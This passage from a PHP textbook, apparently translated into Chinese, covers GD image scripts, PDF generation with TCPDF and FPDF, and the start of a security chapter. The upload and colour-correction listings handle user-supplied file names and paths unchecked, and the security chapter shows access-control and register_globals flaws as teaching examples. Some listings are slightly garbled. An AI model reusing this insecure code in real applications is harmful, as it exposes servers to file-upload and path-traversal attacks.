                imagecolorallocate($image, 51, 51, 204),
                imagecolorallocate($image, 204, 204, 51));

//start angle
$start = 0;
$i = 0;
foreach ($sim->answer as $answer) {
  $end = $start + 360 * intval($answer) / $ant_max;
  imagefilledarc($image, 100, 120, 150, 150, intval($start),
                 intval($end), $colors[$i], IMG_ARC_PIE);

//Label answers:
  imagettftext($image, 10, 0, 200, 50 + 20 * $i, $colors[$i], "
               verdana.ttf", $answer["text"] . ": " . $answer);

//Increment
  $start = $end;
  $i++;
}

//Label question:
$black = imagecolorallocate($image, 0, 0, 0);
imagettftext($image, 14, 0, 20, 20, $black, "verdana.ttf", $sim["text"]);
imagepng($image);
imagedestroy($image);
?>
```

**Listing 30.10 A Pie Chart from an XML File ("diagram_draw.php")**





当然，总是有改进的空间。例如，你可以让格式更具吸引力。你也可以使代码更加模块化。还可以考虑支持多个问题，然后可以在下方或旁边对它们进行评估。

![](img/ae7820c36e8f24c1623d26668b28e80e_837_0.png)

图 30.10 饼图作为调查结果出现

### 颜色校正

例如，我们想要实现自动颜色校正，这是你可能从图像处理软件中知道的一个功能。在下一个清单中，有一个上传页面，用户可以在其中上传他们的图像。

```
<html>
<head>
<title>File upload</title>
</head>
<body>
<form method="post" action="upload_reception.php"
 enctype="multipart/form-data">
 <input type="file" name="File" />
 <input type="submit" value="Upload" />
</form>
</body>
</html>
```

### 清单 30.11 上传页面（"upload.php"）

我们不会进行详尽的文件大小检查或其他安全机制。上传后，我们首先检查是否至少传输了一个文件。如果没有，颜色校正脚本（_颜色校正.php_）将只返回一个黑色区域。文件上传后，它会被移动到 _图像_ 子目录中。在页面中，我们一次以原始状态显示文件，第二次显示校正后的版本。对于后者，我们将文件名和存储位置附加到 URL。

```
<?php
$name1 = "color_correction.php";
$name2 = "color_correction.php";
if (isset($_FILES["File"])) {
    print realpath($_FILES["File"]["name"]);
    move_uploaded_file($_FILES["File"]["tmp_name"],
    "./images/" . $_FILES["File"]["name"]);
    $name1 = "./images/" . $_FILES["File"]["name"];
    $name2 = "color_correction.php?image=" . "./images/" .
    $_FILES["File"]["name"];
}
?>
```

### 清单 30.12 之前和之后（"upload_reception.php"）

颜色校正脚本随后检查是否为要校正的文件指定了文件名。如果是，则对其进行校正。校正分为两个步骤，你可以在清单 30.13 中看到。在第一步中，一个循环遍历所有像素的颜色值并确定最大值和最小值。在第二个循环中，所有像素会被再次处理。只不过这一次，它们被分布的方式使得最大值和最小值现在介于黑色和白色之间，而不是亮度值。这个过程称为 _扩展_ 或 _扩展色调范围_。图 30.11 说明了这种效果。

```
<?php
if (isset($_GET["image"]) && $_GET["image"] != "") {
    header("Content-type:image/jpeg");
$image = imagecreatefromjpeg($_GET["image"]);

$min = 255;
$max = 0;

for ($i=0; $i<imagesx($image); $i++) {
    for ($j=0; $j<imagesy($image); $j++) {
        $f = imagecolorat($image, $i, $j);
        $f = imagecolorsforindex($image, $f);
        $min = min($min, $f["red"], $f["green"], $f["blue"]);
        $max = max($max, $f["red"], $f["green"], $f["blue"]);
    }
}

for ($i=0; $i<imagesx($image); $i++) {
    for ($j=0; $j<imagesy($image); $j++) {
        $f = imagecolorat($image, $i, $j);
        $f = imagecolorsforindex($image, $f);
        $r = ($f["red"] - $min) * 255 / ($max - $min);
        $g = ($f["green"] - $min) * 255 / ($max - $min);
        $b = ($f["blue"] - $min) * 255 / ($max - $min);
        $color = imagecolorallocate($image, $r, $g, $b);
        imagesetpixel($image, $i, $j, $color);
    }
}

imagejpeg($image);
imagedestroy($image);
} else {
header("Content-type:image/gif");
$image = imagecreate(200, 200);

imagegif($image);
imagedestroy($image);
}
?>
```

### 清单 30.13 实际校正（"color_correction.php"）

### 提示

我们的色调值校正机制非常简单。然而，它没有考虑任何不完美之处。例如，如果图像颜色暗淡但有一个白色像素和一个黑色像素，校正将失败。你可以针对这种情况完善算法。

要了解更多信息，最好的方法是阅读一本关于图形编程的经典书籍。但要小心：这会迅速变得复杂，GD 的性能在这种计算中帮不了大忙！

![](img/ae7820c36e8f24c1623d26668b28e80e_840_0.png)

图 30.11 未校正（顶部）和已校正（底部）的图像

## 30.3 替代方案

虽然 GD 2 是 PHP 的标准图形库，但绝非唯一的解决方案。我们希望在此简要介绍其他几种方案。

### 30.3.1 ImageMagick

ImageMagick (www.imagemagick.org) 是最著名的图像处理库之一。它也常与 PHP 一起使用。如果你在滤镜和图像处理方面需要更多功能，使用 ImageMagick 是合理的。ImageMagick 还提供非常好的转换机制。

PHP 中有一个用于连接 ImageMagick 的 PECL 包，可在 [http://s-prs.co/v602285](http://s-prs.co/v602285) 获取。文档可在 [http://s-prs.co/v602286](http://s-prs.co/v602286) 找到。Windows 的二进制文件可在官方 ImageMagick 网站上找到。当前要求是 PHP 5.4.0 或更高版本（这很容易）和 ImageMagick 6.5.3 或更高版本。

> **注意**
> 
> 许多主机已经安装了 ImageMagick 或 GraphicsMagick（参见下一节）。
> 如果你需要高级图像处理，请注意这一点。

### 30.3.2 GraphicsMagick

GraphicsMagick 是最初基于 ImageMagick 的一个变体。这里也提供一个 PECL 包，它基于 GraphicsMagick API 访问 GraphicsMagick 安装（[http://s-prs.co/v602287](http://s-prs.co/v602287)）。

当前要求是 PECL 包的 2.0.5 版本、PHP 7.0.1 或更高版本以及 GraphicsMagick 1.3.17 或更高版本，但 PECL 扩展作为 1.1 分支仍可用于 PHP 5。文档可在 [http://s-prs.co/v602244](http://s-prs.co/v602244) 找到。

### 30.3.3 NetPBM

NetPBM 也值得一看。这个库起源于 Perl，现在可以在 SourceForge 上找到（[http://s-prs.co/v602288](http://s-prs.co/v602288)）。该库的优势之一是其图像格式转换功能。

# 第 31 章

PHP 中的 PDF

PDF 文档在 Web 上用于较长的文档、合同、发票等。本章展示了如何使用 PHP 创建和编辑 PDF 文档。

凭借其可移植文档格式（PDF），Adobe 创造了一个里程碑。该格式被认为是跨平台的，在不同平台上看起来都相同。这种成功是如何实现的？PDF 最初是 Adobe 联合创始人 John Warnock 的一个项目。Adobe 想要找到一种格式，以推动其无纸化办公的愿景。开发人员查看了 Adobe 已经拥有的内容：PostScript 和 Adobe Illustrator（与 PostScript 兼容，并已在 Mac 和 Windows 上运行）。随后，PDF 作为改进的 PostScript 版本被开发出来。添加了许多工具，例如用于读取 PDF 文件的 Reader 和用于创建和修改 PDF 文件的 Distiller。

自 1992 年第一个版本发布以来，发生了很多变化：PDF 现在支持数字版权管理，可以插入注释，并且文档可以随意搜索。用于查看 PDF 文件的 Acrobat Reader 现在也可在移动设备上使用。现在也有大量用于创建和显示 PDF 的免费工具。

这就足够使用 PDF 了。尤其是对于发票之类的文档，PDF 也被视为具有相当约束力的格式。现在，你当然可以从 Adobe 购买 Acrobat，使用其他工具，或使用可用的 PDF 打印机驱动程序之一。结果是一个静态 PDF。但作为 Web 开发者，你知道静态并不好；一切都必须动态。不，说真的：动态生成有许多优势。例如，你可以使用用户的姓名和数据个性化 PDF 文档。

要在服务器端生成 PDF 文档，你可以查阅 PDF 规范（www.adobe.com/devnet/pdf/pdf_reference.html）并自行编写输出。然而，PHP 一如既往地提供了几种通过编程生成 PDF 文件的库。在这种语境下，“几种”几乎是一种轻描淡写的说法。PDF 库比比皆是。大部分库的工作方式相似，主要在功能和许可证方面有所不同。有一段时间，pdfLib（仅限 PDF）作为扩展直接随 PHP 提供，但自 PHP 5.3 起，它已被移至 PECL。此外，名为 Lite 的开源版本于 2011 年停止提供。剩余版本受商业许可证约束，费用相当高。由于有许多良好的开源替代方案可供快速简便地使用，本书不再使用此库。

1 这是一个有争议的话题，但我们不想在此深入讨论。





一个非常著名且经过验证的免费替代方案是 FPDF。TCPDF 使用得更加频繁。该扩展尤其常与 HTML2PDF 结合使用，并被许多开源 CMS 采用。我们还将简要介绍来自 PECL 生态的名为 Haru 的扩展。我们将更详细地介绍 TCPDF 和 FPDF，并通过一个小示例介绍 Haru。然而，还有许多其他替代方案。在这里进行一些研究总是值得的。

## 31.1 Preparation

安装是使用 PDF 最重要的准备工作。不过，了解 PDF 文档的基本结构也没有坏处。如果您已经查看过该格式的规范，那么处理各种库的函数将会更容易。

### 31.1.1 TCPDF

TCPDF 的官方主页是 https://tcpdf.org。不过，所有相关信息和示例都可以在 TCPDF GitHub 项目网站上找到，地址为 http://s-prs.co/v602245。

> **注意**
> GitHub 项目网站还指出，TCPDF 背后的团队目前正在开发 PDF 库的新版本。您可以在 http://s-prs.co/v602246 找到该项目。

我们在此使用 TCPDF 的成熟版本，因为它也是 HTML2PDF（https://html2pdf.fr/default）的基础。此包特别适合从 HTML 模板生成个性化 PDF——例如，在电子商务中用于送货单或发票，或在电子学习中用于证书。

您可以轻松使用 Composer 安装这两个包。关于设置 Composer 本身的一般信息可以在第 38 章中找到。

对于我们的示例，我们将安装 HTML2PDF，因为 TCPDF 已经包含在其中。为此，请切换到 PHP 测试项目的目录，并在控制台/命令提示符中从那里获取相应的包：

```
composer require spipu/html2pdf
```

这些包被打包到 vendor 子目录中。当然，如果您不需要 HTML2PDF，也可以单独安装 TCPDF。在这种情况下，命令如下：

```
composer require tecnickcom/tcpdf
```

### 31.1.2 FPDF

您从 www.fpdf.org 下载 PHP 库，然后在脚本中使用它。不需要安装。

### 31.1.3 Haru

Haru 是基于 Haru Free PDF 库的 PDF 扩展。它在多年里非常活跃且开发完善；然而，目前它非常冷门且不再更新。您可以在 http://s-prs.co/v602289 找到 PECL 包。

安装使用以下命令：

```
--with-haru[=library]
```

在 Windows 中，您将在 PECL 网站上找到相应的 .dll 文件，将其复制到 PHP 的 ext 目录中。然后在 php.ini 中配置扩展：

```
extension=php_haru.dll
```

从 PHP 7.2 开始，锚定库的方法如下：

```
extension=haru
```

## 31.2 TCPDF

TCPDF 库是一个成功的经典。它目前被许多开源系统使用，从 Joomla! 和 TYPO3 等内容管理系统到 Moodle 等学习管理系统。其优势在于对 PDF 规范非常全面的功能覆盖以及对 UTF-8 的完整支持。此外，尽管该库历史悠久，但它完全是面向对象的。

### 31.2.1 Basics

要使用 TCPDF 创建 PDF 文档，必须首先加载库本身：

```
require __DIR__ . '/vendor/autoload.php';
use Com\Tecnick\Pdf;
```

TCPDF 的核心对象是 TCPDF(orientation, unit, format, Unicode, encoding, cache) 类的一个对象：

```
$pdf = new TCPDF('P', 'mm', 'A4', true, 'UTF-8', false);
```

这里使用一些中心值来初始化文档：

- Orientation 决定文档是以肖像格式（P 代表肖像）还是风景格式（L 代表风景）创建。
- Unit 是定位元素、字体大小等的中心度量单位。标准选项是 mm（毫米）或 pt（磅）。
- Format 是 PDF 页面的标准大小。通常，您可以更改单个页面的此设置以及方向。
- Unicode 决定是否使用 Unicode；它是一个布尔值。
- Encoding 定义编码。标准是 UTF-8。
- Cache 指定在创建过程中是否将 PDF 缓存到硬盘（true）。默认值为 false，因为这样更高效。

> **注意**
> TCPDF 库在内部还使用全局常量来设置页面，您可以相应地设置它们。示例包括用于肖像或风景格式页面方向的 PDF_PAGE_ORIENTATION、用于所使用度量单位的 PDF_UNIT，以及用于页面大小的 PDF_PAGE_FORMAT。

接下来，为文档定义元数据。例如，可以使用 SetTitle() 方法。还有其他 PDF 属性，例如作者、关键字等：

```
$pdf->SetTitle('TCPDF Output');
```

然后您需要决定是使用标准 PDF 页眉、修改或扩展它，还是将其省略。我们在此采取简便方法并将其省略：

```
$pdf->setPrintHeader(false);
$pdf->setPrintFooter(false);
```

接下来的设置控制页面间距和分页。对于页面间距，使用文档中选定的单位来定义左、上、右的间距。在我们的示例中，这里选择 0——即没有外部间距——以便在绘制时能够精确控制一切。

SetAutoPageBreak() 设置指定当内容超出当前页面时是否应自动启动新的 PDF 页面。默认情况下这样做很有意义：

```
$pdf->SetMargins(0, 0, 0);
$pdf->SetAutoPageBreak(true, 0);
```

我们正在逐步接近内容。然而，仍有一些设置需要完成。使用 SetFont()，您确定使用哪种字体和哪种字号。AddPage() 还添加第一个 PDF 页面：

```
$pdf->SetFont('Helvetica', '', 48);
$pdf->AddPage();
```

实际输出随后通过 `Write(line height, text, link, padding, alignment)` 进行。末尾的参数需要解释：只有在需要指定链接目标时才需要 `Link`；`Fill` 期望值为 0 表示透明或 1 表示填充。填充颜色必须使用单独的 `SetFillColor()` 方法预先设置。（关于此内容将在 31.2.2 节中进一步介绍。）最后，对齐是一个字符串，允许左对齐（L）、右对齐（R）、居中（C）或两端对齐（J）选项：

```
$output = 'Your statement!';
$pdf->Write(0, $output, '', 0, 'C');
```

使用 `Ln()` 方法，现在可以插入一个新行，以便下一内容出现在下一行。由于此处仅输出一行，因此不一定需要此方法。

现在除了完成的 PDF 文档外，我们基本上已准备好一切。这必须在末尾使用 `Output(name, method)` 方法输出。如果文件由您或用户从浏览器保存，则名称是必需的。方法决定 TCPDF 如何交付 PDF。使用 `I` 时，输出直接在浏览器中进行（如果可能，使用浏览器插件）；`D` 尝试在浏览器中强制直接下载；而使用 `F` 时，它将作为文件保存在服务器上：

```
$pdf->Output('output.pdf', 'I');
```

以下清单显示了整个脚本的概述；图 31.1 显示了输出。

```
require __DIR__ . '/vendor/autoload.php';
use Com\\Tecnick\\Pdf;

$pdf = new TCPDF('P', 'mm', 'A4', true, 'UTF-8', false);

$pdf->SetTitle('TCPDF Output');
$pdf->setPrintHeader(false);
$pdf->setPrintFooter(false);

$pdf->SetMargins(0, 0, 0);
$pdf->SetAutoPageBreak(true, 0);

$pdf->SetFont('Helvetica', '', 48);
$pdf->AddPage();

$output = 'Your statement!';
$pdf->Write(0, $output, '', 0, 'C');

$pdf->Output('output.pdf', 'I');
```

清单 31.1 使用 TCPDF 的第一个文档 ("tcpdf_basics.php")

![图 31.1 第一个文档](img/ae7820c36e8f24c1623d26668b28e80e_848_0.png)

### 31.2.2 Cells

迄今为止，您已使用 Write() 函数逐行输出文本。还可以将文本放置在所谓的单元格中。为此最简单的方法是 Cell(Width, Height, Text, Border, PositionAfter, Alignment, Fill, Link, Scale)。让我们更仔细地查看可能的值，因为它们也与其他元素和方法相关：

- Width 指定文档中选定单位的宽度。如果值为 0，单元格将扩展到右边缘或到右边缘的距离（边距）。
- Height 指定单元格的高度。如果指定为 0，单元格将适应文本高度。
- Text 是实际内容。
- Frame 指定是否显示框架（值 1）或不显示（值 0）。或者，此处可以输入字符串值，以分别显示四个侧面的单独框架（L 代表左，T 代表顶部，R 代表右，B 代表底部）。

您使用单独的方法 SetLineStyle() 来控制框架的外观。

- PositionAfter 控制下一个元素在文档流中的插入位置。此选项的技术术语是字符光标。这可以是元素右侧（默认值 0），也可以继续到下一行（值 1），或者继续到当前元素下方（值 2）。





## 清单 31.2 简单文本框 ("tcpdf_draw.php")

- 排列控制单元格内的文本对齐方式，值为 L 表示左对齐（默认），C 表示居中，R 表示右对齐。
- 填充指定是否有填充（值为 1）或无（默认值 0）。
- 你使用 SetFillColor() 控制填充颜色本身。该方法期望 RGB 颜色值作为参数。以下示例创建蓝色填充，例如：
  $pdf->SetFillColor(0, 0, 255);
- 链接可选地包含链接的 URL。
- 缩放控制单元格内文本的水平缩放方式。默认情况下，缩放被禁用（默认值 0）。因此该参数也控制字母之间的间距。例如，值 2 默认将字母缩放到整个单元格宽度。

> **注意**
> MultiCell() 方法也会创建一个单元格，但支持动态文本换行。你可以在第 31.2.4 节中看到此方法的实际应用。

以下示例创建一个带有蓝色背景和大文本的单元格；图 31.2 显示了输出。

```php
require __DIR__ . '/vendor/autoload.php';
use Com\Tecnick\Pdf;

$pdf = new TCPDF('P', 'mm', 'A4', true, 'UTF-8', false);

$pdf->SetTitle('TCPDF Output');

$pdf->setPrintHeader(false);
$pdf->setPrintFooter(false);

$pdf->SetMargins(0, 0, 0);
$pdf->SetAutoPageBreak(true, 0);

$pdf->SetFont('Helvetica', '', 48);
$pdf->AddPage();

$output = 'Your statement!';

$pdf->SetFillColor(0, 0, 255);
$pdf->Cell(0, 50, $output, 1, 0, 'C', 1, '', 0);

$pdf->Output('output.pdf', 'I');
```

![](img/ae7820c36e8f24c1623d26668b28e80e_850_0.png)

图 31.2 带背景色的文本框

### 31.2.3 线条和点

作为一种格式，PDF 也支持创建矢量图形，并使用点和样式绘制形状和线条。我们将通过一个手绘房屋的简单示例来说明。它由一个矩形组成，我们使用 Rect() 方法创建该矩形，以及一个三角形，我们使用 Polygon() 方法绘制该三角形。

> **注意**
> TCPDF 支持一系列其他形状，例如使用 Circle() 绘制圆形，使用 Line() 绘制线条，甚至使用 Curve() 绘制贝塞尔曲线。这里值得稍作实验。

在以下示例中，我们首先为屋顶（即三角形）创建中心点。第三个坐标同时也是矩形的左上角：

```php
$a1 = [105, 60];
$a2 = [200, 140];
$a3 = [10, 140];
```

接下来是一个带有数组的中心变量。这个数组反过来又包含线条样式的索引-值组合。这些包括线条粗细（width）、端点和连接处的格式（cap 和 join）、线条虚线样式（dash 和 phase 用于虚线起始位置），以及最后但同样重要的，作为带有 RGB 值的数组的颜色：

```php
$line = array('width' => 0.8, 'cap' => 'butt', 'join' => 'bevel',
'dash' => '10,5,15,5', 'phase' => 5, 'color' => array(0, 0, 255));
```

最后的准备工作是为填充创建一种颜色：

```php
$color = array(200, 200, 200);
```

现在是绘图时间了。我们使用 Polygon(PointsArray, Rendering, Line, FillColor, Closed) 方法从三角形开始。最重要的参数是包含点的数组。接下来是渲染样式，其中 DF 表示绘制并填充。对于线条，你可以通过逐个设置数组中的索引（从 0 开始）为每个多边形片段定义单独的样式。使用 all 索引，你可以一次性为所有多边形片段定义样式。下一个参数定义作为数组的填充颜色，这里使用的最后一个参数确保多边形被封闭（值为 true）：

```php
$pdf->Polygon([$a1[0], $a1[1], $a2[0], $a2[1], $a3[0], $a3[1]],
'DF', ['all' => $line], $color, true);
```

房屋的子结构使用 Rect(x, y, width, height, rendering, line, fill color) 方法创建。你会在这里认出 Polygon() 中也使用过的参数：

```php
$pdf->Rect($a3[0], $a3[1], $a2[0] - $a3[0], 80, 'DF',
['L' => $line, 'R' => $line, 'B' => $line], $color);
```

以下清单展示了示例的核心部分，图 31.3 显示了输出。

## 清单 31.3 多边形和矩形（摘自 "tcpdf_draw_paths.php"）

```php
//Title:
$output = 'Draw';
$pdf->SetFillColor(0, 0, 255);
$pdf->Cell(0, 50, $output, 1, 0, 'C', 1);

$a1 = [105, 60];
$a2 = [200, 140];
$a3 = [10, 140];

$line = array('width' => 0.8, 'cap' => 'butt', 'join' => 'bevel',
'dash' => '10,5,15,5', 'phase' => 5, 'color' => array(0, 0, 255));
$color = array(200, 200, 200);

//roof
$pdf->Polygon([$a1[0], $a1[1], $a2[0], $a2[1], $a3[0], $a3[1]], 'DF',
['all' => $line], $color, true);

//House
$pdf->Rect($a3[0], $a3[1], $a2[0] - $a3[0], 80, 'DF', ['L' => $line, 'R'
=> $line, 'B' => $line], $color);

$pdf->Output('output.pdf', 'I');
```

![](img/ae7820c36e8f24c1623d26668b28e80e_852_0.png)

图 31.3 简单的 PDF 房屋

### 31.2.4 饼图

在此示例中，我们动态创建 PDF。为此，我们首先导入一个 XML 文件：

```php
$sim = simplexml_load_file("survey.xml");
```

其背后的文件由带有答案的 question 元素组成：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<question text="Who should be kicked out?">
<answer id="a" text="The coach">577</answer>
<answer id="b" text="The players">53</answer>
<answer id="c" text="The board">85</answer>
</question>
```

示例脚本现在会计算响应数量，并将结果存储在变量 $ans_max 中。然后在一个循环中使用该变量，循环遍历所有响应，每次使用起始角度作为计数器，然后根据响应中的值推进它：

```php
$start = 0;
foreach ($sim->answer as $answer) {
...
$end = $start + 360 * intval($answer) / $ans_max;
...
$start = $end;
}
```

饼图的实际组件现在在这个循环中创建。在第一步中，红色、绿色和蓝色颜色值的 RGB 数值被分配给三个变量的随机值：

```php
$r_random = mt_rand(50, 220);
```

然后使用 PieSector() 方法创建各个饼图扇区：

```php
$pdf->PieSector($pdf->getPageWidth() / 2, 140, $pdf->getPageWidth() / 3,
$start, $end);
```

在此处还使用了 getPageWidth() 方法来确定图表的正确大小。

在最后一步，将每个答案的图例标签设置为 MultiCell：

```php
$pdf->MultiCell(100, 5, $answer["text"] . ": " . $answer, 0, 'L', 0, 1, 5);
```

以下清单一目了然地展示了完整脚本；图表随后在图 31.4 中显示。

```php
$sim = simplexml_load_file("survey.xml");

//Determine the total number of responses
$ans_max = 0;
foreach ($sim->answer as $answer) {
$ans_max += intval($answer);
}
```

```php
require __DIR__ . '/vendor/autoload.php';
use Com\Tecnick\Pdf;

$pdf = new TCPDF('P', 'mm', 'A4', true, 'UTF-8', false);

$pdf->SetTitle('TCPDF Tart');

$pdf->setPrintHeader(false);
$pdf->setPrintFooter(false);

$pdf->SetMargins(0, 0, 0);
$pdf->SetAutoPageBreak(true, 0);

$pdf->AddPage();

//Title
$output = 'Who should be kicked out?';
$pdf->SetFillColor(100, 100, 255);
$pdf->SetFont('Helvetica', '', 36);
$pdf->Cell(0, 50, $output, 1, 0, 'C', 1);
$pdf->LN();

//Legend
$pdf->SetFont('Helvetica', '', 12);
$pdf->MultiCell(100, 8, 'Legend:', 0, 'L', 0, 1, 5, 55);

//start angle
$start = 0;
foreach ($sim->answer as $answer) {
    $r_random = mt_rand(50, 220);
    $g_random = mt_rand(50, 220);
    $b_random = mt_rand(50, 220);
    $pdf->SetFillColor($r_random, $g_random, $b_random);
    $pdf->SetLineStyle(['width' => 1, 'color' => [100, 100, 100],
    'join' => 'bevel']);
    $end = $start + 360 * intval($answer) / $ans_max;
    $pdf->PieSector($pdf->getPageWidth() / 2, 140,
    $pdf->getPageWidth() / 3, $start, $end);
    //Label answers:
    $pdf->SetTextColor($r_random, $g_random, $b_random);
    $pdf->MultiCell(100, 5,
    $answer["text"] . ": " . $answer, 0, 'L', 0, 1, 5);
}

//Increment





$start = $end;
}

$pdf->Output('output.pdf', 'I');

## 列表 31.4 PDF 中的饼图 ("tcpdf_draw_diagram.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_855_0.png)

## 图 31.4 饼图

### 31.2.5 编写 HTML

TCPDF 在处理 HTML 方面的优势（您在上一节中已看到）也是 HTML2PDF 使用此 PDF 库作为基础的原因。

TCPDF 本身具有编写 HTML 的方法。然而，HTML2PDF 更加方便且功能更全面。为此，只需导入 HTML2PDF 库并实例化 Html2Pdf 类的对象：

```
require __DIR__.'./vendor/autoload.php';
use Spipu\Html2Pdf\Html2Pdf;
$html2pdf = new Html2Pdf();
```

其余所有工作随后由 writeHTML(HTML) 方法处理。它将包含 HTML 代码的字符串作为中心参数。这甚至可以包含 CSS 以及表格等复杂元素。

列表 31.5 和图 31.5 展示了一些可能性的概览。

```
$html2pdf = new HTML2Pdf();
$html2pdf->writeHTML('<
<style type="text/css">
table {
    border-collapse: collapse;
}
th, td {
    width: 200px;
    border: 1px solid gray;
    padding: 5px;
}
</style>
<h1>Heading</h1>
<p>An output in a paragraph with a little text and even more text. A
output in a paragraph with a little text and <strong>even</strong> more text. A
output in a paragraph with a little text and even more text. An
output in a paragraph with a little text and even more text. </p>
<hr/>
<h2 style="color: red">Heading 2</h2>
<p>An output in a paragraph with a little text and even more text. One
output in a paragraph with a little text and <strong>even</strong> more text.
more text. An output in a paragraph with a little text and even more text. An
output in a paragraph with a little text and even more text. </p>
<table>
<tr>
<th>cell heading1</th>
<th>cell heading2</th>
</tr>
<tr>
<td>Cell 1</td>
<td>Cell 2</td>
</tr>
</table>');
$html2pdf->output();
```

## **列表 31.5 带 HTML2PDF 的 HTML 输出 ("html2pdf.php")**

![](img/ae7820c36e8f24c1623d26668b28e80e_857_0.png)

## 图 31.5 HTML 输出转换为 PDF

## 31.3 FPDF

FPDF 中的第一个 "F" 代表免费。这也是该库的真正动力——因为老实说，大多数 Web 项目都是商业性质。即使是爱好网站，通常也有一两个广告横幅，因此将不属于非商业网站的定义。然而，尤其是小型网站，往往不愿意在 PDF 库上花钱。这足以成为仔细了解 FPDF 的理由。

> **注意**
> 在 www.fpdf.org，您不仅可以找到 FPDF 本身，还可以找到一份有用的手册。

### 31.3.1 基础

由于 FPDF 基于 PHP，您只需集成相应的类。操作是面向对象的，而且非常简单。您使用 FPDF 对象定义 PDF 文档，并将格式指定为参数：

```
$pdf = new FPDF("P", "pt", "A5");
```

然后继续使用该对象的方法：

```
$pdf->AddPage();
$pdf->SetFont("Helvetica", "", 48);
$pdf->Cell(20,10, "Your statement!");
```

最后，使用 `Output()` 方法输出整个内容。列表 31.6 显示了完整示例，您可以在图 31.6 中看到其输出。

```
<?php
define("FPDF_FONTPATH", "font/");
require "fpdf/fpdf.php";

$pdf=new FPDF("P", "pt", "A5");
$pdf->AddPage();
$pdf->SetFont("Helvetica", "", 48);
$pdf->Cell(20,10, "Your statement!");
$data = $pdf->Output();
header("Content-type: application/pdf");
header("Content-disposition:inline;filename=output.pdf");
print $data;
?>
```

## 列表 31.6 带 FPDF 的首个文档 ("fpdf_basics.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_858_0.png)

## 图 31.6 首个文档

> **注意**
>
> FPDF 有一些特殊功能。例如，与大多数图形程序一样，默认情况下原点位于左上角。您还可以非常灵活地选择单位。

### 31.3.2 绘图

使用 FPDF 进行绘图也非常简单。下面列表中的两行代码足以在背景中创建一个填充的矩形（参见图 31.7）。

```
$pdf->SetFillColor(51, 0, 255);
$pdf->Rect(0, 0, 421, 70, "F");
```

## 列表 31.7 绘制矩形（摘自 "fpdf_draw.php"）

同样重要的是，在第一步中设置填充颜色，它将用于后续操作。在第二步中，使用坐标、宽度和高度创建矩形。

> **注意**
> 您可以在 FPDF 网站 www.fpdf.org/en/script/index.php 上找到许多其他与绘图相关任务的有用示例和脚本。

![](img/ae7820c36e8f24c1623d26668b28e80e_859_0.png)

## 图 31.7 带 FPDF 的背景矩形

## 31.4 结论

生成 PDF 文档可能非常复杂，因为您需要手动绘制元素和对象。但基础知识很简单，在不同的库中也很相似。因此，您偏好哪个库是个人口味的问题。在基于开源的库中，我们主要使用 TCPDF，因为它与 HTML2PDF 相连，而这个选项使快速创建输出变得非常容易。

## 第 VII 部分

# 管理与安全

# 第 32 章

# 安全

据说十分之九的网站存在安全漏洞。本章帮助您尽可能避免安全漏洞。

普遍观点认为，Web 应用程序最大的不确定因素是操作系统或 Web 服务器软件（或服务器端技术）。不幸的是，这是错误的。Web 服务器和操作系统由其制造商维护，安全漏洞会被修补——有时快，有时慢。服务器技术的新版本，尤其是 PHP，也会定期发布。例如，在 PHP 8.3.0 发布后大约四周，发布了修复错误的版本 8.3.1，随后又在大约四周后发布了 PHP 8.3.2。在 2024 年 11 月底，为 PHP 8.1 到 8.3 版本发布了带有安全相关修正的新版本。管理团队肯定有责任保持警惕并保持系统安全。

然而，主要问题既不是管理员，也不是软件提供商。问题通常在于 Web 应用程序自身背后的开发团队。同样的错误总会被犯下，而且其中大部分可以毫不费力地避免。

PHP 安全主题足以填满半本百科全书，因此我们在此仅介绍最重要的要点。但请放心：如果您遵循本章中的建议，您的网站将更加安全，并且对大多数攻击免疫。然而，不存在“完全安全的网站”这种东西。请不断检查您的代码并分析 Web 服务器的日志文件，以了解您的敌人（或脚本小子）的攻击方法。

首先，值得访问开放 Web 应用安全项目（OWASP）的网页。这个项目背后是一群志愿者，他们处理 Web 安全主题。OWASP 以其定期发布（即大约每三到四年一次；参见图 32.1）的网站前 10 项安全漏洞列表而闻名。

您可以在 https://owasp.org/Top10 查看此列表。2021 年的列表（截至 2025 年初仍是最新版本，但当年晚些时候的继任者计划已经在进行中）包含以下项目：

- 1. 访问保护不足
- 2. 加密错误
- 3. 注入和跨站点脚本（XSS）
- 4. 不安全的设计
- 5. 配置不安全
- 6. 使用过时或不安全的组件
- 7. 不安全的识别和身份验证
- 8. 软件和数据完整性不足
- 9. 日志记录和监控不足
- 10. 服务器端请求伪造（SSRF）

![](img/ae7820c36e8f24c1623d26668b28e80e_864_0.png)

## 图 32.1 OWASP 十大

我们将在后面转向此列表中更有趣的要点，但列表本身已经非常有信息量。列表上的几乎所有要点主要与粗心编程有关。无论服务器被管理员保护得多么好，都有可能通过粗心编程破坏整个概念。服务器可能配置得使得外部人员没有权限。但是，如果攻击者接管了一个网站呢？Web 应用程序可能有足够的权限将服务器用于邪恶目的。所以，请小心编程，做好最坏的打算——并继续阅读！

## 32.1 用户输入

几乎所有安全漏洞都与从外部向 Web 应用程序传输信息（这会严重干扰它）有关。这可以通过 a


非常简单的方法。假设你已创建一个内容管理系统，通过该系统向用户提供编辑其文章的机会：

```
<a href="edit.php?id=23">Edit article #23</a>
<a href="edit.php?id=24">Edit article #24</a>
<a href="edit.php?id=27">Edit article #27</a>
```

在示例中，当前用户创建了文章 23、24 和 27，并获得编辑这些特定文章的链接。但是，当用户访问 edit.php?id=25 页面时会发生什么？在安全的系统中，系统会检查用户是否有权执行此操作。然而，在过多系统中，此检查并未执行。在撰写本书的研究测试中，网络上有两个例子特别引起了我的注意：

- 使用此技术，可以“作弊”以获取实际上已售罄活动的访问权限。注册网站的运营商认为，对于已售罄的活动，只需不显示注册链接就足够安全了。然而，在其他页面上，此链接的形式为 registration.php?id=<event number>。

- 在一次专业会议上，来自一位（友好的）PHP 开发人员的演示提案可以被稍微修改。同样，可以通过 URL 中的参数访问。

若不回顾过去的一个黑暗章节，PHP 与安全的话题就无法完整覆盖。如我们在第 13 章中提到，像 $_GET 和 $_POST 这样的超全局数组是在很久以前引入的。曾经非常流行的 register_globals——一个将 HTTP 数据转换为全局变量的功能——在一个次要版本中被自动设置为 php.ini 中的 Off（后来被完全移除——一个好主意）。但是为什么呢？下面的清单提供了一个说明性的示例。

```
<?php
if (isset($_POST["user"]) &&
isset($_POST["password"]) &&
$_POST["user"] == "Christian" &&
$_POST["password"] == "*secret*") {
$loggedIn = true;
}

if ($loggedIn) {
echo "Here is the secret info ...";
}
?>
<html>
<head>
